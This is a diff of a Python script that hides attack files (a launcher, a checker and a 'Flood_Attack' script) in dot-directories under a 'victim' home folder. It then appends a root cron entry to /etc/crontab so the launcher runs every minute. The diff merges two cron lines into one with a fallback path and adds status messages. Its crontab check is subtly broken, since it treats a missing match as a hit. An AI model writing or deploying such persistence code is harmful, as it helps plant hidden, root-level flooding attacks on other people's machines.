@@ -2,8 +2,7 @@ import os
 
 attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-etcAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py'
-varAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py'
+attackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (/usr/bin/python /home/victim/.var/.module/Launch_Attack.py)'
 
 
 def check_attack():
@@ -11,7 +10,10 @@ def check_attack():
         set_up_attack()
 
     if not is_set_up_crontab():
+        print('Set up crontab...')
         set_up_crontab()
+    else:
+        print('Already set up crontab.')
 
 
 def set_up_attack():
@@ -34,7 +36,7 @@ def set_up_crontab():
 
     crontab = open('/etc/crontab', 'a')
 
-    crontab.write(etcAttackCommand)
+    crontab.write(attackCommand)
     crontab.close()
 
 
@@ -56,7 +58,7 @@ def is_set_up_crontab():
     result = False
 
     for line in crontab:
-        if line.find(etcAttackCommand) > -1 or line.find(varAttackCommand) > -1:
+        if line.find('Launch_Attack.py'):
             result = True
 
     crontab.close()
